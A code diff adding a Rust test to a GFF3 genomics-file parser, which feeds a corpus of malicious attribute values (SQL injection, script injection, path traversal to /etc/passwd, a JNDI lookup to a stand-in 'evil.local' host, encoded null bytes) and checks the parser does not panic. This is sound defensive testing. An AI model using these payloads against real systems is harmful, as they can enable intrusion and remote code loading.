@@ -342,6 +342,24 @@ mod tests {
         assert!(err.0.contains("GFF3_FORBIDDEN_HIDDEN_CHAR"));
     }
 
+    #[test]
+    fn parser_handles_malicious_attribute_corpus_without_panicking() {
+        let corpus = [
+            "ID=g1;Name=' OR 1=1 --",
+            "ID=g2;Name=<script>alert(1)</script>",
+            "ID=g3;Name=../../etc/passwd",
+            "ID=g4;Name=${jndi:ldap://evil.local/a}",
+            "ID=g5;Name=%00%0a%0d",
+        ];
+        for attrs in corpus {
+            let tmp = tempdir().expect("tempdir");
+            let gff = tmp.path().join("malicious.gff3");
+            let row = format!("chr1\tsrc\tgene\t1\t10\t.\t+\t.\t{attrs}\n");
+            fs::write(&gff, row).expect("write gff3");
+            let _ = parse_gff3_records(&gff);
+        }
+    }
+
     proptest! {
         #[test]
         fn id_values_reject_whitespace_and_hidden_chars(seed in "[A-Za-z0-9_\\-]{1,32}") {
